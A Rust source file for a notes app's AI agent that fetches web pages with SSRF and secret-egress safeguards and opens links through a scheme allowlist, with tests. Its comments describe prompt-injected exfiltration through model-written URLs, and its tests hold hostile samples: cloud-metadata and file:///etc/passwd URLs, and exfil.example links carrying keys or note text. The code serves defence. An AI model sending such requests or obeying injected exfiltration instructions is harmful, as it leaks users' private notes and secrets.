//! Public-page fetch and safe OS link opening for the agentic client. Search
//! provider adapters live in `web_search.rs`; every network path remains in
//! Rust because the webview CSP allows only IPC.
//!
//! SECURITY — the secret-egress backstop. Before any outbound request we run
//! `crate::secret::looks_secure` on the query / URL; a match aborts the call so a
//! secure note's contents can never ride a web request off the machine. The TS
//! orchestrator runs the same check first; this is defense in depth.
//!
//! SECURITY — SSRF. `web_fetch` takes a model-controlled URL, so it must never
//! reach private/loopback/link-local/metadata address space. See the hardened
//! fetch path below: the block lives in a custom resolver on a dedicated agent,
//! so the vetting and the connect use the same addresses (no DNS-rebinding
//! TOCTOU), with manual same-host redirects on top.

use std::io::Read;
use std::net::{IpAddr, SocketAddr, ToSocketAddrs};
use std::time::Duration;

use regex::Regex;
use tauri::Url;

const UA: &str = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

// ── hardened fetch path (SSRF) ────────────────────────────────────────────────
//
// Policy mirrors breve-runtime/scripts/safe-fetch.ts (MIRROR-NOT-IMPORT across
// the app boundary) — parity is held by the shared adversarial fixture
// scripts/fixtures/egress-fixtures.json, asserted by tests on BOTH sides.
// Scope: web_fetch ONLY. The DDG search fetchers above and chat.rs's sanctioned
// localhost model traffic keep their own agents and stay off this path.

/// Byte cap on a fetched body (`byteCap` in egress-fixtures.json — the stricter
/// of the two sides' historical caps; both were 2 MB).
const WEB_FETCH_MAX_BYTES: u64 = 2_000_000;
/// Manual redirect hop cap, same-host only (`maxRedirectHops` in egress-fixtures.json).
const WEB_FETCH_MAX_REDIRECTS: u32 = 3;
/// URL length cap (`maxUrlChars` in egress-fixtures.json). A model-authored URL
/// is the loop's highest-bandwidth egress channel — an injected instruction can
/// stuff read-note prose into query params — so an over-long URL is refused
/// outright (audit 2026-07). 2048 matches the classic interoperable limit.
const WEB_FETCH_MAX_URL_CHARS: usize = 2048;
/// Private / loopback / link-local / ULA / CGNAT / unspecified — never connect.
fn ip_is_private(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            let o = v4.octets();
            o[0] == 0                                          // 0/8 "this network"
                || o[0] == 10                                  // 10/8
                || o[0] == 127                                 // 127/8 loopback
                || (o[0] == 169 && o[1] == 254)                // 169.254/16 link-local incl. metadata
                || (o[0] == 172 && (16..=31).contains(&o[1]))  // 172.16/12
                || (o[0] == 192 && o[1] == 168)                // 192.168/16
                || (o[0] == 100 && (64..=127).contains(&o[1])) // 100.64/10 CGNAT
        }
        IpAddr::V6(v6) => {
            if let Some(mapped) = v6.to_ipv4_mapped() {
                return ip_is_private(IpAddr::V4(mapped)); // ::ffff:a.b.c.d
            }
            let seg0 = v6.segments()[0];
            v6.is_loopback()                 // ::1
                || v6.is_unspecified()       // ::
                || (seg0 & 0xfe00) == 0xfc00 // fc00::/7 ULA (covers fd00::/8)
                || (seg0 & 0xffc0) == 0xfe80 // fe80::/10 link-local
        }
    }
}

/// Name-level block, no DNS needed: loopback/mDNS/intranet names never leave the Mac.
fn host_name_blocked(host: &str) -> bool {
    let h = host.to_ascii_lowercase();
    h.is_empty() || h == "localhost" || h.ends_with(".local") || h.ends_with(".internal")
}

/// Pure pre-dispatch vet: scheme, no credentials, name policy, literal-IP privacy.
/// DNS-resolved hosts are vetted again inside the connection path (`vetted_resolve`).
fn vet_fetch_url(raw: &str) -> Result<Url, String> {
    if raw.chars().count() > WEB_FETCH_MAX_URL_CHARS {
        return Err("blocked: that URL is too long to fetch.".into());
    }
    let url = Url::parse(raw).map_err(|e| format!("bad URL ({e})"))?;
    if !matches!(url.scheme(), "http" | "https") {
        return Err("web_fetch needs an http(s) URL.".into());
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err("blocked: credentials in a URL are refused.".into());
    }
    let host = url.host_str().ok_or("blocked: URL has no host.")?;
    let bare = host.trim_start_matches('[').trim_end_matches(']');
    if host_name_blocked(bare) {
        return Err(format!(
            "blocked host: {bare} — web_fetch reaches the public internet only."
        ));
    }
    if let Ok(ip) = bare.parse::<IpAddr>() {
        if ip_is_private(ip) {
            return Err(format!("blocked: {ip} is a private/reserved address."));
        }
    }
    Ok(url)
}

/// Per-hop redirect vet: parseable target, full URL vet, and SAME host as the
/// first request (a redirect may not steer the fetch to a new origin).
fn vet_redirect(current: &Url, location: &str, first_host: &str) -> Result<Url, String> {
    let next = current
        .join(location)
        .map_err(|e| format!("bad redirect Location ({e})"))?;
    let next = vet_fetch_url(next.as_str())?;
    let host = next.host_str().unwrap_or_default().to_ascii_lowercase();
    if host != first_host {
        return Err(format!("cross-host redirect refused ({host})"));
    }
    Ok(next)
}

/// The resolver installed on the web_fetch agent: resolve, then reject any
/// private/blocked address, returning only vetted addresses — the connected IPs
/// are by construction the vetted IPs, which kills the rebinding TOCTOU.
fn vetted_resolve(netloc: &str) -> std::io::Result<Vec<SocketAddr>> {
    use std::io::{Error, ErrorKind};
    let host = netloc.rsplit_once(':').map_or(netloc, |(h, _)| h);
    let host = host.trim_start_matches('[').trim_end_matches(']');
    if host_name_blocked(host) {
        return Err(Error::new(
            ErrorKind::PermissionDenied,
            format!("blocked host: {host}"),
        ));
    }
    let addrs: Vec<SocketAddr> = netloc.to_socket_addrs()?.collect();
    if let Some(bad) = addrs.iter().find(|a| ip_is_private(a.ip())) {
        return Err(Error::new(
            ErrorKind::PermissionDenied,
            format!("{host} resolves to a blocked address ({})", bad.ip()),
        ));
    }
    if addrs.is_empty() {
        return Err(Error::new(
            ErrorKind::NotFound,
            format!("no addresses for {host}"),
        ));
    }
    Ok(addrs)
}

/// The dedicated agent for web_fetch — `redirects(0)` because hops are followed
/// manually in `web_fetch` (≤ WEB_FETCH_MAX_REDIRECTS, same-host, each hop
/// re-entering this same vetted resolver).
fn fetch_agent() -> &'static ureq::Agent {
    static AGENT: std::sync::OnceLock<ureq::Agent> = std::sync::OnceLock::new();
    AGENT.get_or_init(|| {
        ureq::AgentBuilder::new()
            .resolver(vetted_resolve)
            .redirects(0)
            .timeout(Duration::from_secs(20))
            .build()
    })
}

/// Read at most WEB_FETCH_MAX_BYTES so a huge page can't OOM us.
fn read_capped(r: impl Read) -> Result<Vec<u8>, String> {
    let mut buf = Vec::new();
    r.take(WEB_FETCH_MAX_BYTES)
        .read_to_end(&mut buf)
        .map_err(|e| format!("read failed ({e})"))?;
    Ok(buf)
}

/// Fetch a web page and return readable text (HTML stripped, entities decoded).
/// Output is capped (`max_chars`, default 8000) so a page can't blow the small
/// model's context. The egress guard blocks a URL that looks like a secret; the
/// hardened agent above blocks private/loopback/link-local/metadata targets.
///
/// ASYNC command (perf audit 2026-07-30, #3): the blocking ureq fetch (20s
/// timeout × up to 3 redirect hops) froze the window for its full duration.
/// It runs on a worker now; the secret guard, SSRF vetting (`vet_fetch_url` /
/// `vet_redirect`), and the size cap all stay exactly where they were.
#[tauri::command]
pub async fn web_fetch(url: String, max_chars: Option<usize>) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || web_fetch_blocking(&url, max_chars))
        .await
        .map_err(|e| format!("web fetch worker failed ({e})"))?
}

fn web_fetch_blocking(url: &str, max_chars: Option<usize>) -> Result<String, String> {
    let url = url.trim();
    if !(url.starts_with("http://") || url.starts_with("https://")) {
        return Err("web_fetch needs an http(s) URL.".into());
    }
    if crate::secret::blocked_for_remote(url) {
        return Err("blocked: that URL looks like it contains a secret — not fetching it.".into());
    }
    let cap = max_chars.unwrap_or(8000).clamp(500, 20_000);
    let mut current = vet_fetch_url(url)?;
    let first_host = current.host_str().unwrap_or_default().to_ascii_lowercase();
    let mut hops = 0u32;
    let resp = loop {
        let resp = fetch_agent()
            .request("GET", current.as_str())
            .set("User-Agent", UA)
            .set("Accept-Language", "en-US,en;q=0.9")
            .call()
            .map_err(|e| format!("fetch failed ({e})"))?;
        if !(300..400).contains(&resp.status()) {
            break resp;
        }
        hops += 1;
        if hops > WEB_FETCH_MAX_REDIRECTS {
            return Err("too many redirects".into());
        }
        let loc = resp
            .header("location")
            .ok_or("redirect with no Location header")?
            .to_string();
        current = vet_redirect(&current, &loc, &first_host)?;
    };
    let buf = read_capped(resp.into_reader())?;
    let text = html_to_text(&String::from_utf8_lossy(&buf));
    Ok(truncate_chars(&text, cap))
}

// ── HTML → text ───────────────────────────────────────────────────────────────

fn html_to_text(html: &str) -> String {
    static SCRIPT: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    static STYLE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    static BLOCKS: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    let script = SCRIPT.get_or_init(|| Regex::new(r"(?is)<script\b[^>]*>.*?</script>").unwrap());
    let style = STYLE.get_or_init(|| Regex::new(r"(?is)<style\b[^>]*>.*?</style>").unwrap());
    let s = script.replace_all(html, " ");
    let s = style.replace_all(&s, " ");
    // block-level tags become newlines so paragraphs/list items don't run together
    let blocks = BLOCKS.get_or_init(|| {
        Regex::new(r"(?is)<\s*/?\s*(br|p|div|li|tr|h[1-6]|ul|ol|section|article|header|footer|nav|main)\b[^>]*>")
            .unwrap()
    });
    let s = blocks.replace_all(&s, "\n");
    let s = strip_tags(&s);
    let s = decode_entities(&s);
    collapse_ws(&s)
}

fn strip_tags(s: &str) -> String {
    static RE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?s)<[^>]+>").unwrap())
        .replace_all(s, "")
        .to_string()
}

fn collapse_ws(s: &str) -> String {
    let mut out = String::new();
    let mut blanks = 0;
    for line in s.lines() {
        let t = line.split_whitespace().collect::<Vec<_>>().join(" ");
        if t.is_empty() {
            blanks += 1;
            if blanks <= 1 {
                out.push('\n');
            }
        } else {
            blanks = 0;
            out.push_str(&t);
            out.push('\n');
        }
    }
    out.trim().to_string()
}

fn decode_entities(s: &str) -> String {
    let mut s = s
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x27;", "'")
        .replace("&apos;", "'")
        .replace("&nbsp;", " ");
    static NUM: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    let num = NUM.get_or_init(|| Regex::new(r"&#(x?[0-9A-Fa-f]+);").unwrap());
    s = num
        .replace_all(&s, |c: &regex::Captures| {
            let raw = &c[1];
            let cp = if let Some(hex) = raw.strip_prefix('x').or_else(|| raw.strip_prefix('X')) {
                u32::from_str_radix(hex, 16).ok()
            } else {
                raw.parse::<u32>().ok()
            };
            cp.and_then(char::from_u32)
                .map(|ch| ch.to_string())
                .unwrap_or_default()
        })
        .to_string();
    // &amp; last so "&amp;lt;" doesn't become "<"
    s.replace("&amp;", "&")
}

fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max).collect();
    out.push('…');
    out
}

// ─── open a rendered link in the browser (#14, audit 2026-07) ────────────────
//
// The editor/chat render markdown links but nothing could OPEN one. This is the
// scheme-allowlisted opener: http/https/mailto ONLY — never file:// (a note
// could point at anything on disk), never a custom scheme (arbitrary app
// launch). The allowlist also guarantees the argument can't start with "-", so
// `open` can't mistake it for a flag.

/// Pure: is this URL safe to hand to the OS opener? Lowercased scheme must be
/// http/https/mailto and the string must carry no whitespace/control chars.
pub fn url_openable(url: &str) -> bool {
    if url.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return false;
    }
    let lower = url.to_ascii_lowercase();
    // a bare scheme opens nothing — require at least one char after it
    (lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("mailto:"))
        && lower != "http://"
        && lower != "https://"
        && lower != "mailto:"
}

/// Open a link from a rendered note/chat in the user's browser (or mail app).
///
/// This is an EGRESS SEAM and was not treated as one until 2026-08-01 (audit
/// GAP 4). `url_openable` bounds the SCHEME, which stops an arbitrary app
/// launch — but nothing bounded the CONTENT, so `open_url` was the one network
/// channel with no secret gate at all: a compromised webview could hand the OS
/// `https://attacker.example/?d=<a secure note's body>` and the user's browser
/// would fetch it. The webview can invoke this directly, so the agent loop's
/// own `EGRESS_TOOLS` list never applied. It now asks the same question every
/// other outbound lane asks.
#[tauri::command]
pub fn open_url(url: String) -> Result<(), String> {
    let url = url.trim();
    if !url_openable(url) {
        return Err("only http(s) and mailto links open from here.".into());
    }
    if crate::secret::blocked_for_remote(url) {
        return Err("blocked: that link carries private content — it won't be opened.".into());
    }
    #[cfg(target_os = "macos")]
    std::process::Command::new("open")
        .arg(url)
        .spawn()
        .map_err(|e| e.to_string())?;
    #[cfg(not(target_os = "macos"))]
    let _ = url;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn html_to_text_strips_and_decodes() {
        let t = html_to_text("<p>Hello&nbsp;<b>world</b> &amp; friends</p><script>evil()</script>");
        assert!(t.contains("Hello world & friends"), "got: {t:?}");
        assert!(!t.contains("evil"));
    }

    // ── SSRF hardening — shared fixtures (scripts/fixtures/egress-fixtures.json) ──
    // The same file drives breve-runtime/tests/test-safe-fetch-fixtures.ts: parity
    // by fixture, not shared impl. Every case here is decidable WITHOUT network.

    fn egress_fixtures() -> serde_json::Value {
        serde_json::from_str(include_str!("../../scripts/fixtures/egress-fixtures.json"))
            .expect("egress-fixtures.json parses")
    }

    #[test]
    fn fixture_caps_match_the_consts() {
        let f = egress_fixtures();
        assert_eq!(f["byteCap"].as_u64().unwrap(), WEB_FETCH_MAX_BYTES);
        assert_eq!(
            f["maxRedirectHops"].as_u64().unwrap(),
            u64::from(WEB_FETCH_MAX_REDIRECTS)
        );
        assert_eq!(
            f["maxUrlChars"].as_u64().unwrap() as usize,
            WEB_FETCH_MAX_URL_CHARS
        );
    }

    /// The exfil-bandwidth cap (audit 2026-07): a URL stuffed past the cap is
    /// refused on the first vet — including on a redirect hop.
    #[test]
    fn over_long_urls_are_refused() {
        let long = format!(
            "https://example.com/?q={}",
            "a".repeat(WEB_FETCH_MAX_URL_CHARS)
        );
        assert!(vet_fetch_url(&long).is_err());
        let fine = format!("https://example.com/?q={}", "a".repeat(500));
        assert!(vet_fetch_url(&fine).is_ok());
    }

    #[test]
    fn fixture_ips_classify_private_vs_public() {
        for e in egress_fixtures()["ips"].as_array().unwrap() {
            let raw = e["ip"].as_str().unwrap();
            let ip: IpAddr = raw.parse().expect(raw);
            assert_eq!(
                ip_is_private(ip),
                e["private"].as_bool().unwrap(),
                "ip: {raw}"
            );
        }
    }

    #[test]
    fn fixture_hosts_follow_the_name_policy() {
        for e in egress_fixtures()["hosts"].as_array().unwrap() {
            let host = e["host"].as_str().unwrap();
            assert_eq!(
                host_name_blocked(host),
                e["blocked"].as_bool().unwrap(),
                "host: {host}"
            );
        }
    }

    #[test]
    fn fixture_urls_get_the_rust_verdict() {
        for e in egress_fixtures()["urls"].as_array().unwrap() {
            let url = e["url"].as_str().unwrap();
            let allow = e["rust"].as_str().unwrap() == "allow";
            assert_eq!(vet_fetch_url(url).is_ok(), allow, "url: {url}");
        }
    }

    #[test]
    fn fixture_redirects_get_the_shared_verdict() {
        for e in egress_fixtures()["redirects"].as_array().unwrap() {
            let from = Url::parse(e["from"].as_str().unwrap()).unwrap();
            let first_host = from.host_str().unwrap().to_ascii_lowercase();
            let loc = e["location"].as_str().unwrap();
            let allow = e["verdict"].as_str().unwrap() == "allow";
            assert_eq!(
                vet_redirect(&from, loc, &first_host).is_ok(),
                allow,
                "location: {loc}"
            );
        }
    }

    #[test]
    fn resolver_refuses_private_and_blocked_netlocs() {
        // literal IPs + blocked names never touch DNS, so this runs offline
        assert!(vetted_resolve("localhost:80").is_err());
        assert!(vetted_resolve("something.local:443").is_err());
        assert!(vetted_resolve("127.0.0.1:80").is_err());
        assert!(vetted_resolve("[::1]:443").is_err());
        assert!(vetted_resolve("169.254.169.254:80").is_err()); // cloud metadata
        assert!(vetted_resolve("10.0.0.1:80").is_err());
        assert!(vetted_resolve("192.168.1.1:443").is_err());
        assert!(vetted_resolve("8.8.8.8:443").is_ok()); // public literal passes
    }

    #[test]
    fn web_fetch_refuses_hostile_urls_before_any_network() {
        assert!(web_fetch_blocking("http://169.254.169.254/latest/meta-data", None).is_err());
        assert!(web_fetch_blocking("http://localhost:11435/v1/models", None).is_err());
        assert!(web_fetch_blocking("https://user:pass@example.com/", None).is_err());
        assert!(web_fetch_blocking("ftp://example.com/x", None).is_err()); // scheme
        assert!(web_fetch_blocking("file:///etc/passwd", None).is_err());
    }

    #[test]
    fn redirect_vet_covers_host_scheme_and_privacy() {
        let from = Url::parse("https://a.example.com/start").unwrap();
        assert!(vet_redirect(&from, "https://a.example.com/next", "a.example.com").is_ok());
        assert!(vet_redirect(&from, "/relative", "a.example.com").is_ok());
        assert!(vet_redirect(&from, "https://b.example.com/next", "a.example.com").is_err()); // other host
        assert!(vet_redirect(&from, "https://localhost/x", "a.example.com").is_err()); // private name
        assert!(vet_redirect(&from, "ftp://a.example.com/f", "a.example.com").is_err()); // scheme
        let ip_from = Url::parse("https://8.8.8.8/start").unwrap();
        assert!(vet_redirect(&ip_from, "http://169.254.169.254/x", "8.8.8.8").is_err());
        // private target
    }

    #[test]
    fn read_capped_truncates_at_the_byte_cap() {
        let big = std::io::repeat(b'a').take(WEB_FETCH_MAX_BYTES + 50_000);
        let buf = read_capped(big).unwrap();
        assert_eq!(buf.len() as u64, WEB_FETCH_MAX_BYTES);
        let small = std::io::Cursor::new(b"tiny".to_vec());
        assert_eq!(read_capped(small).unwrap(), b"tiny");
    }

    /// AUDIT 2026-08-01, GAP 4 — `open_url` was the one outbound lane with no
    /// content gate at all. `url_openable` bounds the SCHEME; nothing bounded
    /// the payload, and the webview can invoke this directly, so the agent
    /// loop's own tool allowlist never applied.
    #[test]
    fn open_url_refuses_a_link_carrying_private_content() {
        // secret-shaped, in the query string
        assert!(open_url("https://exfil.example/?k=sk-ant-abcdefghijklmnop".into()).is_err());
        // and ordinary prose the vault has told the gate is secure
        crate::secret::remember_secure_text(
            "The Wexford easement dispute settles out of court in autumn.",
        );
        assert!(open_url(
            "https://exfil.example/?d=the+wexford+easement+dispute+settles+out".into()
        )
        .is_err());
        // the scheme rule is unchanged and still comes first
        assert!(open_url("file:///etc/passwd".into()).is_err());
    }

    #[test]
    fn url_openable_allows_only_web_and_mail_schemes() {
        assert!(url_openable("https://example.com/page?q=1"));
        assert!(url_openable("http://localhost:3000/x"));
        assert!(url_openable("HTTPS://EXAMPLE.COM")); // scheme case-insensitive
        assert!(url_openable("mailto:alex@example.com"));
        // never these: disk paths, app launches, flags, injection shapes
        assert!(!url_openable("file:///etc/passwd"));
        assert!(!url_openable("javascript:alert(1)"));
        assert!(!url_openable("x-apple.systempreferences:"));
        assert!(!url_openable("-a Calculator"));
        assert!(!url_openable("https://a.com/ b")); // whitespace
        assert!(!url_openable("https://a.com/\u{0}b")); // control char
        assert!(!url_openable("https://")); // bare scheme
        assert!(!url_openable("mailto:"));
        assert!(!url_openable(""));
    }
}
